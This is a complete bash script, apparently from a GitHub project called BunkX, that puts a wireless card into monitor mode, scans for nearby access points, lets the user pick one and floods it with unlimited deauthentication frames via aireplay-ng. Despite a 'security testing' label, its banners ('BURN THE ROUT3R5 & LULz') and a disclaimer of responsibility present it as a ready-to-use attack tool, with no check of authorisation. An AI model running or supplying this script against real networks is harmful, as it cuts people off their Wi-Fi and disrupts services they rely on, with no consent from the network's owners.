#!/bin/bash

# ======================================================================================
# BunkX Deauthentication Tool - Professional Network Security Testing Suite
# Developer: DoomsDay (d00mzd4y@proton.me)
# GitHub: https://github.com/Dooms-D4y
# 
# Features:
# - AP deauthentication attacks
# - Network scanning and selection
# - Monitor mode management
# - Graceful cleanup
# Just be responsible enough. I'm not to be held responsible for your mess
# But have fun being productive 😉
# ======================================================================================

# Display BunkX banner
echo -e "\e[1;31m"
cat << "EOF"
 ____                    __      __   __     
/\  _`\                 /\ \    /\ \ /\ \    
\ \ \L\ \  __  __    ___\ \ \/'\\ `\`\/'/'   
 \ \  _ <'/\ \/\ \ /' _ `\ \ , < `\/ > <     
  \ \ \L\ \ \ \_\ \/\ \/\ \ \ \\`\  \/'/\`\  
   \ \____/\ \____/\ \_\ \_\ \_\ \_\/\_\\ \_\
    \/___/  \/___/  \/_/\/_/\/_/\/_/\/_/ \/_ /                                            
EOF
echo -e "\e[0m"

# Developer information
echo -e "\e[1;36m"
echo "         +-----------------------------------------------+"
echo "         |Developed by: DoomsDay                         |"
echo "         |Contact: d00mzd4y@proton.me                    |"
echo "         |GitHub: https://github.com/Dooms-D4y/BunkX.git |"
echo "         +---------------------[v0.1]--------------------+"
echo -e "\e[0m"
echo "=================================================================================="

# Check root privileges
if [ "$EUID" -ne 0 ]; then
    echo -e "\e[1;31m[ERROR] Run as root: sudo $0\e[0m" >&2
    exit 1
fi

# Verify required tools
if ! command -v iw &> /dev/null || ! command -v aireplay-ng &> /dev/null; then
    echo -e "\e[1;31m[ERROR] Missing required tools. Install with:\e[0m"
    echo "sudo apt update && sudo apt install -y iw aircrack-ng"
    exit 1
fi

# Cleanup function
cleanup() {
    echo -e "\n\e[1;33m[!] Cleaning up...\e[0m"
    
    # Kill all background processes
    pkill -f "airodump-ng" 2>/dev/null
    pkill -f "aireplay-ng" 2>/dev/null
    
    # Revert interface to managed mode
    if [[ -n $IFACE && -d /sys/class/net/"$IFACE" ]]; then
        echo -e "\e[1;33m[+] Reverting $IFACE to managed mode\e[0m"
        ip link set "$IFACE" down
        iw "$IFACE" set type managed
        ip link set "$IFACE" up
    fi
    
    # Restart network services
    if systemctl restart NetworkManager &>/dev/null || service network-manager restart &>/dev/null; then
        echo -e "\e[1;32m[+] Network services restored\e[0m"
    fi
    
    # Remove temp files
    rm -f /tmp/network_scan_*
    echo -e "\e[1;32m[+] System restored. Exiting safely.\e[0m"
    exit 0
}

# Trap Ctrl+C
trap cleanup SIGINT

# Reliable scan networks function
scan_networks() {
    local scan_interface=$1
    local scan_attempt=0
    local max_attempts=2
    local scan_duration=8  # seconds per attempt
    
    while [ $scan_attempt -lt $max_attempts ]; do
        ((scan_attempt++))
        local scan_file="/tmp/network_scan_$scan_attempt"
        
        echo -e "\n\e[1;36m[+] Scanning networks attempt $scan_attempt/$max_attempts ($scan_duration seconds)...\e[0m"
        
        # Start airodump-ng in background with controlled timeout
        timeout $scan_duration airodump-ng -w "$scan_file" --output-format csv "$scan_interface" &> /dev/null &
        local scan_pid=$!
        
        # Show progress spinner
        local i=1
        local sp="/-\|"
        echo -n "    "
        while kill -0 $scan_pid 2>/dev/null; do
            printf "\b${sp:i++%${#sp}:1}"
            sleep 0.2
        done
        printf "\b \n"
        
        # Check if scan file was created
        if [[ -f "${scan_file}-01.csv" ]]; then
            # Parse results
            awk -F',' '
            BEGIN { 
                print "\033[1;35mIndex\tBSSID              \tCH\tPWR\tESSID\033[0m"
                idx = 0
            }
            /^[0-9a-fA-F:]{17}/ {
                # Skip empty BSSIDs
                if ($1 == "") next
                
                # Get ESSID (field 14) and remove quotes
                essid = $14
                gsub(/^ *"/, "", essid)
                gsub(/" *$/, "", essid)
                
                if (essid == "") essid="[Hidden]"
                
                # Only count if we have valid data
                if ($1 ~ /^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$/) {
                    idx++
                    printf "\033[1;33m%-2d\033[0m\t%-17s\t%2s\t%3s\t\033[1;36m%-32s\033[0m\n", 
                        idx, $1, $4, $8, substr(essid,1,32)
                    # Store in plain format for later use
                    printf "%d\t%s\t%s\t%s\t%s\n", 
                        idx, $1, $4, $8, essid >> "/tmp/network_plain"
                }
            }' "${scan_file}-01.csv" > /tmp/network_list
            
            # Check if we found any networks
            if [ -s /tmp/network_list ]; then
                echo -e "\n\e[1;95mAvailable Networks:\e[0m"
                echo "=================================================================="
                cat /tmp/network_list
                echo "=================================================================="
                return 0
            fi
        fi
        
        echo -e "\e[1;33m[!] No networks found in attempt $scan_attempt\e[0m"
        sleep 1
    done
    
    echo -e "\e[1;31m[ERROR] Scanning failed after $max_attempts attempts\e[0m" >&2
    echo -e "\e[1;33mPossible causes:\e[0m"
    echo "1. Weak signal or no nearby networks"
    echo "2. Wireless driver issues"
    echo "3. Antenna problems"
    return 1
}

# Main script
echo -e "\n\e[1;46m BURN THE ROUT3R5 & LULz \e[0m"
echo -e "\e[1;33m[!] 🖕 th3 syst3m! Press Ctrl+C to exit\e[0m\n"

# Interface selection
read -p "Wireless interface [wlan0]: " IFACE
IFACE=${IFACE:-wlan0}

# Verify interface exists
if ! [ -e /sys/class/net/"$IFACE" ]; then
    echo -e "\e[1;31m[ERROR] Interface $IFACE not found!\e[0m" >&2
    echo -e "Available interfaces:"
    ls /sys/class/net | grep -v lo
    exit 1
fi

# Check current mode
CURRENT_MODE=$(iw dev "$IFACE" info | grep type | awk '{print $2}')
if [ "$CURRENT_MODE" != "monitor" ]; then
    # Put interface in monitor mode without renaming
    echo -e "\e[1;33m[+] Setting $IFACE to monitor mode...\e[0m"
    
    # Kill conflicting processes
    airmon-ng check kill &>/dev/null
    
    # Change interface mode
    ip link set "$IFACE" down
    if ! iw "$IFACE" set type monitor; then
        echo -e "\e[1;31m[ERROR] Failed to set monitor mode!\e[0m" >&2
        echo -e "\e[1;33mTroubleshooting tips:\e[0m"
        echo "1. Check driver support: iw list | grep 'Supported interface modes' -A10"
        echo "2. Try: sudo modprobe -r iwlmvm && sudo modprobe iwlmvm"
        exit 1
    fi
    ip link set "$IFACE" up
    echo -e "\e[1;32m[+] Monitor mode enabled on $IFACE\e[0m"
else
    echo -e "\e[1;32m[+] $IFACE already in monitor mode\e[0m"
fi

# Initialize network data file
> /tmp/network_plain

# Network discovery
if ! scan_networks "$IFACE"; then
    cleanup
fi

# Get network count from plain data file
NETWORK_COUNT=$(wc -l < /tmp/network_plain)
if [ "$NETWORK_COUNT" -eq 0 ]; then
    echo -e "\e[1;31m[ERROR] No valid networks found after scan\e[0m" >&2
    cleanup
fi

# Target selection
echo -e "\e[1;32m[+] Found $NETWORK_COUNT networks\e[0m"
while true; do
    read -p "Select target network [1-$NETWORK_COUNT]: " SELECTION
    if [[ "$SELECTION" =~ ^[0-9]+$ ]] && [ "$SELECTION" -ge 1 ] && [ "$SELECTION" -le "$NETWORK_COUNT" ]; then
        # Extract selected network info from plain data
        SELECTED_LINE=$(awk -v sel="$SELECTION" '$1 == sel' /tmp/network_plain)
        BSSID=$(echo "$SELECTED_LINE" | awk '{print $2}')
        CHANNEL=$(echo "$SELECTED_LINE" | awk '{print $3}')
        ESSID=$(echo "$SELECTED_LINE" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}')
        break
    else
        echo -e "\e[1;31m[ERROR] Invalid selection. Enter number 1-$NETWORK_COUNT\e[0m" >&2
    fi
done

# Set channel
echo -e "\e[1;33m[+] Locking $IFACE to channel $CHANNEL\e[0m"
iw dev "$IFACE" set channel "$CHANNEL" || {
    echo -e "\e[1;31m[ERROR] Failed to set channel $CHANNEL\e[0m" >&2
    cleanup
}

# Start attack
echo -e "\n\e[1;31m[+] STARTING DEAUTH ATTACK \e[0m"
echo -e "Target:    \e[1;33m$ESSID\e[0m"
echo -e "BSSID:     \e[1;33m$BSSID\e[0m"
echo -e "Channel:   \e[1;33m$CHANNEL\e[0m"
echo -e "Interface: \e[1;33m$IFACE\e[0m"
echo -e "\e[1;31mPress Ctrl+C to STOP ATTACK\e[0m\n"

# Run deauthentication
aireplay-ng --deauth 0 -a "$BSSID" "$IFACE" --ignore-negative-one

# Cleanup on normal exit
cleanup
